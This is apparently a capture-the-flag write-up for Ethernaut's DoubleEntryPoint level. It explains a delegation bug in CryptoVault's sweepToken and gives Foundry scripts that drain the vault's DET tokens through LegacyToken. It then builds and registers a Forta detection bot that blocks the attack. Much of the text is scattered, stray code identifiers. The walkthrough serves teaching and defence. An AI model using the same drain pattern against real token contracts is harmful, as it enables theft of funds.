@@ -1,0 +1,408 @@
+"This level consists of multiple contracts that interact together. One of those contracts is called the CryptoVault. Our task is to find a bug in the CryptoVault and protect the contract from being drained of tokens. 
+CryptoVault
+CryptoVault
+This level features a CryptoVault with special functionality, the sweepToken function. This is a common function used to retrieve tokens stuck in a contract. The CryptoVault operates with an underlying token that can't be swept, as it is an important core logic component of the CryptoVault. Any other tokens can be swept.
+The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.
+In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.
+The contract features a Forta contract where any user can register its own detection bot contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a detection bot and register it in the Forta contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.
+We will go through the contracts, understand their logic and implementation, and find the bug. We will then learn to implement a monitoring bot called Forta to raise alerts to prevent the attack. Brace yourselves, this is a wild ride. 
+We have two ERC20 token contracts, LegacyToken (LGT) and DoubleEntryPoint (DET), and a vault CryptoVault with a very special function that also happens to be vulnerable. 
+The CryptoVault initially holds 100 tokens each of LGT and DET. 
+Let's take a look at the contracts one by one starting with the LegacyToken.
+LegacyToken (LGT)
+DoubleEntryPoint (DET)
+CryptoVault
+CryptoVault
+LegacyToken
+contract LegacyToken is ERC20(""LegacyToken"", ""LGT""), Ownable {
+    DelegateERC20 public delegate;
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+
+    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
+        delegate = newContract;
+    }
+
+    function transfer(address to, uint256 value) public override returns (bool) {
+        if (address(delegate) == address(0)) {
+            return super.transfer(to, value);
+        } else {
+            return delegate.delegateTransfer(to, value, msg.sender);
+        }
+    }
+}
+
+transfer()
+delegate
+0
+transfer()
+delegateTransfer()
+delegate()
+delegate
+DoubleEntryPoint
+delegateToNewContract()
+delegate
+onlyOwner
+contract DoubleEntryPoint is ERC20(""DoubleEntryPointToken"", ""DET""), DelegateERC20, Ownable {
+    address public cryptoVault;
+    address public player;
+    address public delegatedFrom;
+    Forta public forta;
+
+    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
+        delegatedFrom = legacyToken;
+        forta = Forta(fortaAddress);
+        player = playerAddress;
+        cryptoVault = vaultAddress;
+        _mint(cryptoVault, 100 ether);
+    }
+
+    modifier onlyDelegateFrom() {
+        require(msg.sender == delegatedFrom, ""Not legacy contract"");
+        _;
+    }
+
+    modifier fortaNotify() {
+        address detectionBot = address(forta.usersDetectionBots(player));
+
+        // Cache old number of bot alerts
+        uint256 previousValue = forta.botRaisedAlerts(detectionBot);
+
+        // Notify Forta
+        forta.notify(player, msg.data);
+
+        // Continue execution
+        _;
+
+        // Check if alarms have been raised
+        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert(""Alert has been triggered, reverting"");
+    }
+
+    function delegateTransfer(
+        address to,
+        uint256 value,
+        address origSender
+    ) public override onlyDelegateFrom fortaNotify returns (bool) {
+        _transfer(origSender, to, value);
+        return true;
+    }
+}
+
+onlyDelegateFrom()
+msg.sender
+delegatedFrom
+LegacyToken
+LegacyToken
+fortaNotify()
+delegateTransfer()
+delegateTransfer()
+LegacyToken
+onlyDelegateFrom()
+LegacyTokens
+fortaNotify()
+_transfer
+value
+origSender
+to
+contract CryptoVault {
+    address public sweptTokensRecipient;
+    IERC20 public underlying;
+
+    constructor(address recipient) public {
+        sweptTokensRecipient = recipient;
+    }
+
+    function setUnderlying(address latestToken) public {
+        require(address(underlying) == address(0), ""Already set"");
+        underlying = IERC20(latestToken);
+    }
+
+    /*
+    ...
+    */
+
+    function sweepToken(IERC20 token) public {
+        require(token != underlying, ""Can't transfer underlying token"");
+        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
+    }
+}
+
+setUnderlying()
+DoubleEntryPoint
+require()
+sweepToken()
+DoubleEntryPoint
+transfer()
+token
+sweptTokensRecipient
+sweptTokensRecipient
+Did you spot the bug yet? If not, no worries. Neither did I on the first try.
+Let's say we are the attackers and we wanted to exploit this contract-vault conjunction and want to drain the CryptoVault. The only function capable of draining the vault is sweepToken. But we can't drain the DET directly due to the input validation. But what if we enter the address of the LGT here?
+CryptoVault
+sweepToken
+DET
+LGT
+The Vault will try to call the function LegacyToken.transfer() which directs the flow into the LegacyToken contract. 
+LegacyToken.transfer()
+LegacyToken
+The LegacyToken will call the overridden function and will make the following call:
+LegacyToken
+delegate.delegateTransfer(to, value, msg.sender); == DoubleEntryPoint.delegateTransfer(sweptTokensRecipient, CryptoVault's Total Balance, CryptoVault's Address);
+
+The delegate contract will be DoubleEntryPoint as set in the contract by the owner, and the msg.sender will be the CryptoVault since it sent the transaction to the LegacyToken. The value will be equal to CryptoVault's total balance, i.e., token.balanceOf(address(this)). 
+delegate
+DoubleEntryPoint
+msg.sender
+CryptoVault
+LegacyToken
+value
+CryptoVault's
+token.balanceOf(address(this))
+Now the execution flow will go to DoubleEntryPoint contract inside the delegateTransfer() function. 
+DoubleEntryPoint
+delegateTransfer()
+onlyDelegateFrom
+DoubleEntryPoint
+msg.sender
+LegacyToken
+DET
+CryptoVault
+require(token != underlying, ""Can't transfer underlying token"");
+Let's try to replicate the attack. 
+The contract object which Ethernaut gives us in the console is DoubleEntryPoint contract. We can validate this by fetching the address of the CryptoVault and then querying the value of underlying. Let's run a small script to confirm our hypothesis and get the addresses for the vault, DET, and LGT tokens:
+DoubleEntryPoint
+CryptoVault
+underlying
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel26.sol"";
+
+contract POC is Script {
+
+     DoubleEntryPoint level26 = DoubleEntryPoint(0xBDc7cd60eca4b6EA63A4e5A37d543Ff803B6D6DA);
+    function run() external{
+        vm.startBroadcast();
+
+        address CryptoVault = level26.cryptoVault();
+        CryptoVault.call(abi.encodeWithSignature(""underlying()""));
+        address LGT = level26.delegatedFrom();
+
+        vm.stopBroadcast();
+    }
+}
+
+Let's run the script using the following command:
+forge script ./script/level26.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
+
+It can be seen in the screenshot below that the first address was for the CryptoVault and the next one was fetched from the CryptoVault and which also matches the instance address provided to us by Ethernaut. 
+CryptoVault
+CryptoVault
+The last one is coming from delegatedFrom which should be the address of LegacyToken. 
+delegatedFrom
+LegacyToken
+
+Since we got the address of the CryptoVault, let's also confirm on the Goerli explorer to check the number of tokens stored in the vault:
+CryptoVault
+
+So the vault owns 100 tokens each of LGT and DET. Now that we are sure, let's drain all the DET from the vault. Here's our new code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel26.sol"";
+
+contract POC is Script {
+
+     DoubleEntryPoint level26 = DoubleEntryPoint(0xBDc7cd60eca4b6EA63A4e5A37d543Ff803B6D6DA);
+    function run() external{
+        vm.startBroadcast();
+
+        CryptoVault vault = CryptoVault(level26.cryptoVault());
+        address DET = address(vault.underlying());
+        address LGT = level26.delegatedFrom();
+        vault.sweepToken(IERC20(LGT)); //calling sweepToken with LGT address on the CryptoVault
+
+        vm.stopBroadcast();
+    }
+}
+
+
+And as expected, the vault was drained of DET tokens which can also be verified on the Etherscan:
+
+Let's take a look at the last contract that we skipped earlier:
+contract Forta is IForta {
+    mapping(address => IDetectionBot) public usersDetectionBots;
+    mapping(address => uint256) public botRaisedAlerts;
+
+    function setDetectionBot(address detectionBotAddress) external override {
+            require(address(usersDetectionBots[msg.sender]) == address(0), ""DetectionBot already set"");
+            usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
+    }
+
+    function notify(address user, bytes calldata msgData) external override {
+        if(address(usersDetectionBots[user]) == address(0)) return;
+        try usersDetectionBots[user].handleTransaction(user, msgData) {
+                return;
+        } catch {}
+    }
+
+    function raiseAlert(address user) external override {
+            if(address(usersDetectionBots[user]) != msg.sender) return;
+            botRaisedAlerts[msg.sender] += 1;
+    } 
+}
+
+setDetectionBot()
+msg.sender
+usersDetectionBots[msg.sender]
+notify()
+handleTransaction()
+handleTransaction()
+notify()
+fortaNotify()
+raiseAlert()
+msg.sender
+There's an interface as well called IDetectionBot with a single function signature called handleTransaction(). 
+IDetectionBot
+handleTransaction()
+interface IDetectionBot {
+    function handleTransaction(address user, bytes calldata msgData) external;
+}
+
+We need to build a bot, that will extend the IDetectionBot interface and will implement a function called handleTransaction() that will raise an alert if certain conditions are met. Now onto the condition part. 
+IDetectionBot
+handleTransaction()
+We need our bot to detect malicious transactions that are draining the CryptoVault contract. The attack happened using the following steps:
+CryptoVault
+CryptoVault.sweepToken(LGT)
+CryptoVault
+sweepToken
+LegacyToken
+LegacyToken.transfer(sweptTokensRecipient, CryptoVault's Token Balance);
+LegacyToken
+DoubleEntryPoint.delegateTransfer(sweptTokensRecipient, CryptoVault's Total Balance, CryptoVault's Address);
+delegateTransfer()
+origSender
+CryptoVault
+Based on the above observation, we can create a detection to raise an alert if the value of origSender == value of CryptoVault. 
+origSender
+CryptoVault
+When the function delegateTransfer() is called, the modifier fortaNotify() is taking in msg.data and passing it to the forta.notify() function. We can make use of this msg.data and create our bot logic. 
+delegateTransfer()
+fortaNotify()
+msg.data
+forta.notify()
+msg.data
+To proceed further, we must learn how the msg.data is organized and received by the bot. 
+msg.data
+msg.data
+fortaNotify()
+function delegateTransfer(address to, uint256 value, address origSender)
+notify()
+handleTransaction(user, msgData)
+msg.data
+msg.data
+msg.data
+function handleTransaction(address user, bytes calldata msgData) external;
+bytes calldata msgData
+msg.data
+delegateTransfer()
+origSender
+To learn more about how this is arranged, refer to the second half of the writeup here.
+The following table shows the arrangement of calldata as seen by our Detection bot which we'll develop. The value which we want to focus on is origSender on 0xa8 position. 
+origSender
+0xa8
+handleTransaction(address,bytes)
+0x220ab6aa
+user
+msgData
+msgData
+delegateTransfer(address,uint256,address)
+0x9cd1a121
+to
+value
+origSender
+Function signatures can be obtained using the following command:
+cast sig ""handleTransaction(address,bytes)""
+
+From the table above, it can be seen that the first half deals with the function handleTransaction() and the next half is its argument msgData that contains delegateTransfer() call with the parameter origSender which we need to extract. 
+handleTransaction()
+msgData
+delegateTransfer()
+origSender
+Here's how our Alert Bot looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface IDetectionBot {
+    function handleTransaction(address user, bytes calldata msgData) external;
+}
+
+interface IForta {
+    function setDetectionBot(address detectionBotAddress) external;
+    function notify(address user, bytes calldata msgData) external;
+    function raiseAlert(address user) external;
+}
+
+contract AlertBot is IDetectionBot {
+    address private cryptoVault;
+
+    constructor(address _cryptoVault) public {
+        cryptoVault = _cryptoVault;
+    }
+
+    function handleTransaction(address user, bytes calldata msgData) external override {
+
+        address origSender;
+        assembly {
+            origSender := calldataload(0xa8)
+        }
+
+        if(origSender == cryptoVault) {
+            IForta(msg.sender).raiseAlert(user);
+        }
+    }
+}
+
+cryptoVault
+CryptoVault
+calldataload(0xa8)
+0xa8
+CryptoVault
+origSender
+Let's deploy this bot contract using the following command:
+forge create AlertBot --private-key $PKEY --rpc-url $RPC_URL --constructor-args <CryptoVault's_Address>
+
+
+Now we just need to send a call to register our bot using the following script:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel26.sol"";
+
+contract POC is Script {
+
+     DoubleEntryPoint level26 = DoubleEntryPoint(0xBDc7cd60eca4b6EA63A4e5A37d543Ff803B6D6DA);
+    function run() external{
+        vm.startBroadcast();
+
+        level26.forta().setDetectionBot(0x3D078c608A1E80B13DEAf7a3b25d7F9AB3FCA0f3);
+
+        vm.stopBroadcast();
+    }
+}
+
+Running the script using the following command:
+forge script ./script/level26-2.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
+
+
+Our bot is registered and now the attacker won't be able to sweep the tokens because whenever they try calling the CryptoVault's sweepToken() function to drain DET, our bot will raise an alert and revert the transaction. 
+The instance can now be submitted to finish the level. 
+sweepToken()
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e.."
